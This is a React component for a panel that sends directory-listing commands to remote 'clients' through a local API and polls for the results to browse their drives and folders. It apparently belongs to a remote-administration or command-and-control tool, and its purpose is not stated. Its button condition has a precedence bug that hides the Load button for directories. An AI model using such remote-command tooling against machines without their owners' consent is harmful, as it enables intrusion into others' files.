import React, { useState, useEffect } from "react";
import { Loading } from "./Loading";
import axios from "axios";

async function sendFileCommand(data) {
  const url = "http://localhost/api/commands/";
  try {
    const headers = {
      "Content-Type": "application/json",
    };
    const response = await axios.post(url, data, { headers });
    return response.data;
  } catch (error) {
    return { error: error.message };
  }
}

export const UserFiles = ({ id }) => {
  const [files, setFiles] = useState(null);
  const [loading, setLoading] = useState(false);
  const [fetchingId, setFetchingId] = useState(null);

  useEffect(() => {
    let interval = null;

    if (loading && fetchingId) {
      interval = setInterval(async () => {
        const url = `http://localhost/api/command-response/${fetchingId}`;
        try {
          const response = await axios.get(url);

          if (response.data && response.data.data) {
            let parsed;
            try {
              parsed =
                typeof response.data.data === "string"
                  ? JSON.parse(response.data.data)
                  : response.data.data;
            } catch (err) {
              console.error("JSON parse error:", err);
              return;
            }

            setFiles(parsed.items || []);
            setLoading(false);
            setFetchingId(null);
            clearInterval(interval);
          }
        } catch (error) {
          console.error("Error fetching command response:", error);
        }
      }, 3000);
    }

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [loading, fetchingId]);

  const handleSendFileCommandBtn = async (id, command) => {
    const data = { client: id, command: command, temp: true };
    const result = await sendFileCommand(data);
    console.log("Command send result:", result);
    if (!result.error) {
      setLoading(true);
      setFetchingId(result.id);
    }
  };

  console.log("Loading state:", loading, "Fetching ID:", fetchingId);

  if (loading) {
    return (
      <div className="p-4 centered">
        <span>Loading..</span> <Loading />
      </div>
    );
  }

  console.log("the files are ", files);

  return (
    <div className="p-4">
      <h3>User Files</h3>

      {files ? (
        <ul className="list-disc list-inside">
          {files.map((file, index) => (
            <li key={index} className="mb-2">
              <span className="font-medium">{file.name}</span>
              <span className="text-gray-500 ml-2">({file.entry_type})</span>
              {file.entry_type === "directory" || file.entry_type === "drive"  && (
                <button
                  className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-1 px-2 rounded ml-4"
                  onClick={()=>{
                    handleSendFileCommandBtn(id, `dir ${file.path}`);
                  }}
                  >Load</button>)
              }
            </li>
          ))}
        </ul>
      ) : (
        <div>
          <h4>No Files</h4>
          <button
            className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
            onClick={() => {
              handleSendFileCommandBtn(id, "dir");
            }}
          >
            Load Drives
          </button>
        </div>
      )}
    </div>
  );
};
